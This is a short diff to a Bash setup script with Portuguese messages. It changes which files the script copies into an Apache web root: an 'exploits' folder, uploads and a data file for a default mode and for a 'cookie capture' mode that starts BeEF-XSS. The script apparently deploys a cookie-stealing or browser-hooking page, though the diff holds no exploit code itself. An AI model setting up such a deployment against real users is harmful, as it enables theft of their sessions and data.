@@ -148,10 +148,11 @@ process_model_choice() {
         1)
             echo -e "${GREEN}Você escolheu: Standart${NC}"
             cp "$type_egs/index.php" "$apache"
+            cp "$type_egs/dados.txt" "$apache"
+            cp -r "$type_egs/uploads/" "$apache"
             echo "[** Script carregado com sucesso no apache **]"
             cp -r "$type_egs/exploits/" "$apache"
             echo "[** Exploits carregados com sucesso no apache **]"
-            cp "$type_egs/dados.txt" "$apache"
             echo "[** Dados carregados com sucesso **]"
             chmod +x "$apache/"* # Nivel de permissão de arquivos
             cd "$apache"
@@ -165,6 +166,9 @@ process_model_choice() {
         2)
             echo -e "${GREEN}Você escolheu: Captura de cookies Beta${NC}"
             cp "$type_egs/2.php" "$apache"
+            cp "$type_egs/dados.txt" "$apache"
+            cp -r "$type_egs/uploads/" "$apache"
+            cp -r "$type_egs/exploits/" "$apache"
             echo "[** Script carregado com sucesso no apache **]"
             echo "[** Iniciando Beef-xss **]"
             systemctl start beef-xss
